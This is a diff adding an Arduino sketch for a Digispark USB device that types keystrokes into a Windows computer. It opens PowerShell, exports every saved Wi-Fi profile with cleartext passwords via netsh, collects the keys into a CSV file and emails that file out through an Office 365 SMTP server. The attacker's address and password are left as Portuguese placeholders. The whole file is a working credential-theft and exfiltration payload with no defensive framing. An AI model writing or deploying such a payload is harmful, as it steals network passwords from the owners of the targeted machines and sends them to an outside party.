@@ -1,0 +1,47 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+ // DigiKeyboard.print("cd C:\\");
+  //DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("md C:\\Attack");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ // DigiKeyboard.print("cd Attack");
+ // DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.println("netsh wlan export profile key=clear folder=C:\\Attack");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+ // DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Select-string -Path C:\\Attack\\Wi*.xml -Pattern 'KeyMaterial' > C:\\Attack\\pass.csv");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println(F("$From = \SEU EMAIL\""));
+  DigiKeyboard.println(F("$To = \"SEU EMAIL\""));
+  DigiKeyboard.println(F("$Cc = \"SEU EMAIL\""));
+  DigiKeyboard.println(F("$Subject = \"senhas wifi\""));
+  DigiKeyboard.println(F("$Body = \"senhas\""));
+  DigiKeyboard.println(F("$SMTPServer = \"smtp.office365.com\""));
+  DigiKeyboard.println(F("$SMTPPort = 587")); 
+  DigiKeyboard.println(F("$Username = \"SEU EMAIL\""));
+  DigiKeyboard.println(F("$Password = \"SUA SENHA\"")); 
+  DigiKeyboard.println(F("$Password = ConvertTo-SecureString -String $Password -AsPlainText -Force"));
+  DigiKeyboard.println(F("$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)"));
+  DigiKeyboard.println(F("$Attachment = \"C:\\Attack\\pass.csv\""));
+  DigiKeyboard.println(F("Send-MailMessage -From $From -To $To -Cc $Cc -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Credential -Attachments $Attachment"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {
+  // Loop vazio
+}
